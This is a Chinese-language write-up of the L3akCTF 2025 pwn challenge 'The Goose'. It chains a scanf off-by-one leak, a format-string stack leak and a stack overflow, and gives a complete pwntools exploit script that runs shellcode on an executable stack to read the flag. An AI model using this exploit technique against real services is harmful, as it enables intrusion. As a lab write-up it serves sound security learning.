# L3akCTF 2025 The Goose Writeup

## 题目简述

The Goose 要求玩家猜中一个 10 到 100 之间的随机 “HONK” 数量，猜中后才能进入留言功能。程序依次包含三个可串联的漏洞：

1. 用户名恰好填满全局数组后不再有有效终止符，可泄漏紧邻的随机数；
2. 留言前的欢迎语存在格式化字符串漏洞，可泄漏栈地址；
3. `read()` 向 128 字节栈缓冲区读取 1024 字节，可覆盖返回地址。

二进制无栈 canary，栈可执行。最终可以把读 flag 的 shellcode直接放在栈上并跳转执行。

## 解题过程

### 利用全局变量相邻布局泄漏 nhonks

全局变量按下列顺序定义：

```c
char username[64];
int nhonks = 0;
```

用户名使用：

```c
scanf("%64s", username);
```

`scanf` 的字段宽度不包含结尾 NUL。输入 64 个非空白字节后，64 字节数组被完全填满，终止符会落到数组之后。随后 `main()` 才执行：

```c
nhonks = (rand() % 91) + 10;
```

这会把刚写入的 NUL 覆盖成 `nhonks` 的低字节。程序之后用 `%s` 打印 `username`，因数组内部没有终止符，输出会继续读到相邻整数。由于随机数只在 10 到 100 之间，其高字节均为零，所以恰好泄漏一个有效字节：

```python
io.sendlineafter(b"> ", b"A" * 64)
io.recvuntil(b"so ")
io.recvn(64)
nhonks = u8(io.recvn(1))
io.sendline(str(nhonks).encode())
```

这样即可稳定进入 `highscore()`。

### 通过格式化字符串定位栈缓冲区

`highscore()` 先把姓名格式化进 `buf`，随后错误地把该缓冲区直接当作格式串：

```c
sprintf(buf, fstr, nam);
printf(buf);
```

姓名可控，因此发送：

```text
hehe%lx
```

生成的 `buf` 中仍含 `%lx`，第二次 `printf()` 会把某个残留参数解释为十六进制指针。对仓库所附二进制进行调试可知，该泄漏指向格式化缓冲区内、距其起点 6 字节的位置，而后续 `msg` 缓冲区又位于其前方 `0x120` 字节。因此：

```python
io.sendlineafter(b"again?", b"hehe%lx")
io.recvuntil(b"hehe")
leak = int(io.recvuntil(b" ", drop=True), 16)

msg_addr = leak - 6 - 0x120
```

这些相对距离来自本题具体编译结果；若重新编译，应在调试器中重新核对，而不是照搬绝对值。

### 栈溢出执行 shellcode

留言代码为：

```c
char msg[128];
read(0, msg, 1024);
```

保护检查显示栈可执行且没有 canary。保存的返回地址距 `msg` 起点 `0x178` 字节，可以直接在 `msg` 开头放置 shellcode，用 NOP 填充到返回地址，再把 RIP 改为 `msg_addr`：

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

io = remote("challenge.host", 5000)

# 第一阶段：泄漏随机数
io.sendlineafter(b"> ", b"A" * 64)
io.recvuntil(b"so ")
io.recvn(64)
nhonks = u8(io.recvn(1))
io.sendline(str(nhonks).encode())

# 第二阶段：泄漏栈地址
io.sendlineafter(b"again?", b"hehe%lx")
io.recvuntil(b"hehe")
stack_leak = int(io.recvuntil(b" ", drop=True), 16)
msg_addr = stack_leak - 6 - 0x120

# 第三阶段：覆盖 RIP
io.recvuntil(b"world?")
shellcode = asm(shellcraft.cat("/flag.txt"))
payload = shellcode.ljust(0x178, b"\x90") + p64(msg_addr)
io.sendline(payload)

io.interactive()
```

执行后得到：

```text
L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}
```

对仓库本地二进制使用同一泄漏关系和覆盖偏移，可以成功执行等价的本地读文件 shellcode，并恢复上述 flag。

## 方法总结

本题考查的是基础漏洞串联。随机校验本身不可预测，但相邻全局变量与缺失的字符串终止符把随机数泄漏出来；PIE 和 ASLR 隐藏了地址，却又被格式化字符串泄漏绕过；最后利用可执行栈和无 canary 的长读完成控制流劫持。

`scanf("%Ns")` 最多会读取 $N$ 个字符，并额外写入一个 NUL，因此目标数组至少需要 $N+1$ 字节。格式化字符串漏洞也不仅能直接写内存，在只需要绕过 ASLR 时，一个稳定的 `%p` 或 `%lx` 泄漏就足够。把每个漏洞放回后续利用需求中分析，比孤立地寻找单个“致命漏洞”更容易构造完整利用链。
